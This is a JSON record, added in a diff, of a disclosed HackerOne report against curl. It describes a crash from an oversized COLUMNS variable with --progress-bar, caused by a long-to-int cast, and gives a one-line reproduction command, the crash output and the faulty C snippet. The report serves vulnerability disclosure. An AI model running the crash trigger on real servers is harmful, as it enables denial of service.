@@ -1,0 +1,109 @@
+{
+  "id": 636013,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzYwMTM=",
+  "url": "https://hackerone.com/reports/636013",
+  "title": "huge COLUMNS causes progress-bar to buffer overflow",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2019-07-04T23:24:45.720Z",
+  "submitted_at": "2019-07-04T23:24:45.720Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pendrek",
+    "url": "/pendrek",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-02-08T07:55:53.496Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-01-08T08:25:45.027Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nIf an attacker can set environmental variables, curl will always crash with a buffer overflow when downloading a file &ndash; if the `--progress-bar` argument is set.\n\n## Steps To Reproduce:\nJust run the following command on a **64-bit Linux** system (verified on Ubuntu 19.04).\n\n```bash\n# Of course you can set the COLUMNS variable in your `.profile` configuration file instead...\nenv COLUMNS=\"9223372032559808515\" curl \"http://hubblesource.stsci.edu/sources/video/clips/details/images/hale_bopp_2.mpg\" -o \"./test.mpg\"\n```\n\n**Output**\n```\n      23,0%*** buffer overfow detected ***: curl terminated\nAborted (core dumped)\n```\n\n**Explanation of the bug**\nThe `progress-bar` feature parses the `COLUMNS` environment variable. The source code aims to guarantee this value to be above 20. However, on Linux systems this check fails due to a faulty integer cast in `tool_cb_prg.c`:\n\n```c\ncolp = curlx_getenv(\"COLUMNS\");\nif(colp) {\n     char *endptr;\n     long num = strtol(colp, &endptr, 10);\n     // Our value of 9223372032559808515 will be OK!\n     if((endptr != colp) && (endptr == colp + strlen(colp)) && (num > 20))\n         // BUG! Back to int... 9223372032559808515 becomes 3.\n         bar->width = (int)num;\n```\n\nThen on **line 181** we have the buffer overflow:\n\n```c\n    barwidth = bar->width - 7; // HERE we get 3-7 resulting in...\n    num = (int) (((double)barwidth) * frac);\n    if(num > MAX_BARLENGTH)\n      num = MAX_BARLENGTH;\n    memset(line, '#', num); // .... a crazy high value here!\n```\n\n## Impact\n\n**If** a server runs `curl` with the `--progress-bar` argument set **and** (intentionally or unintentionally) allows an attacker to set environmental variables, the server could easily become a victim of a DoS attack.",
+  "weakness": {
+    "id": 3,
+    "name": "Classic Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "monke"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
